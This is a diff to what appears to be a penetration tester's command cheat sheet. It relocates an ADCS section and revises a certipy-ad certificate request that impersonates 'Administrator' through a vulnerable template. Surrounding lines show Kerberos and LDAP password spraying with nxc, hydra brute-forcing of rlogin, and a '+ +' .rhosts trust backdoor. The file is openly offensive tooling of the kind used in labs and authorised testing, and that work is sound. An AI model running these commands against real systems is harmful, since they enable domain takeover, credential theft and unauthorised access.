@@ -327,6 +327,12 @@ dig axfr @$TARGET $DOM
 finger '$USERNAME'@$TARGET
 while read -r user; do finger "$user"@$TARGET; done < usernames
 
+[*] ADCS
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
+
+certipy-ad find -dc-ip $TARGET -target-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -k -vulnerable -enabled -stdout
+certipy-ad req -dc-ip $TARGET -target-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -k -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096'
+
 [*] (88) Kerberos
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -k -M adcs
@@ -438,12 +444,6 @@ hydra rlogin://$TARGET -L usernames -P passwords -t35
 
 echo '+ +' > .rhosts; chmod 600 .rhosts
 rlogin $USERNAME@$TARGET
-
-[*] ADCS
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
-
-certipy-ad find -u '$USERNAME' -p '$PASSWORD' -dc-ip $TARGET -vulnerable -enabled -stdout
-certipy-ad req -target '$DC' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096' -k -no-pass
 
 [*] (1433) MSSQL
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
